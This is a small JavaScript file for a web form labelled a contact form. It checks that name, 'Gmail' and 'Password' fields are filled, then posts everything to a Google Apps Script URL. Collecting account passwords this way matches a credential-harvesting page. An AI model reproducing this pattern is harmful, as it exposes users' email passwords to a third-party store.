const scriptURL = 'https://script.google.com/macros/s/AKfycbwQ8N8vjF6MgBElmUn72rIXWKSKBd5aldhIG8b6e4bg3ZOPuWVFPApj53pUjYBaZE43/exec';

const form = document.forms['contact-form'];

form.addEventListener('submit', e => {
    e.preventDefault();
    fetch(scriptURL, {
            method: 'POST',
            body: new FormData(form)
        })
        .then(response => alert("Thank you! your form is submitted successfully."))
        .then(() => {
            window.location.reload();
        })
        .catch(error => console.error('Error!', error.message));
});

let nameEl = document.getElementById("name");
let GmailEl = document.getElementById("Gmail");
let PasswordEl = document.getElementById("Password");
let errorMssgNameEl = document.getElementById("errorMssgName");
let errorMssgGmailEl = document.getElementById("errorMssgGmail");
let errorMssgPswdEl = document.getElementById("errorMssgPswd");
let submitEl = document.getElementById("submit");

nameEl.addEventListener("blur", function(event) {
    if (event.target.value === "") {
        errorMssgNameEl.textContent = "Required*";
    } else {
        errorMssgNameEl.textContent = "";
    }
});

GmailEl.addEventListener("blur", function(event) {
    if (event.target.value === "") {
        errorMssgGmailEl.textContent = "Required*";
    } else {
        errorMssgGmailEl.textContent = "";
    }
});

PasswordEl.addEventListener("blur", function(event) {
    if (event.target.value === "") {
        errorMssgPswdEl.textContent = "Required*";
    } else {
        errorMssgPswdEl.textContent = "";
    }
});

function submitdata() {
    if (nameEl.value === "") {
        alert("Enter Name");
    } else if (GmailEl.value === "") {
        alert("Enter Gmail");
    } else if (PasswordEl.value === "") {
        alert("Enter Password");
    }
}

submitEl.addEventListener("click", submitdata);